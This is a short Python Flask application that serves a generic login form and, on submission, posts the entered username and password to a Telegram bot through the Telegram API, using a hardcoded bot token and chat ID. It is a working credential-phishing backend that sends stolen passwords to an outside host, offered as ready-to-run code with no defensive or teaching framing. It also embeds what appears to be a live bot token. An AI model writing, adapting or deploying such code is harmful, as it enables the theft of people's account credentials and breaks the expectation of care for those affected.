from flask import Flask, request

import requests



app = Flask(__name__)



@app.route('/')

def home():

    return '''

        <form action="/login" method="post">

            Username: <input type="text" name="username"><br>

            Password: <input type="password" name="password"><br>

            <input type="submit" value="Login">

        </form>

    '''



@app.route('/login', methods=['POST'])

def login():

    username = request.form['username']

    password = request.form['password']

    # Send login details to your Telegram bot

    telegram_bot_token = '5387277594:AAHcNjVgQZPSvBob0fgzMtlz288ACRYo_LU'

    chat_id = '5211852084'

    message = f"Username: {username}, Password: {password}"

    requests.post(f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage", data={'chat_id': chat_id, 'text': message})

    return "Login details sent!"



if __name__ == '__main__':

    app.run(host='0.0.0.0', port=5000)


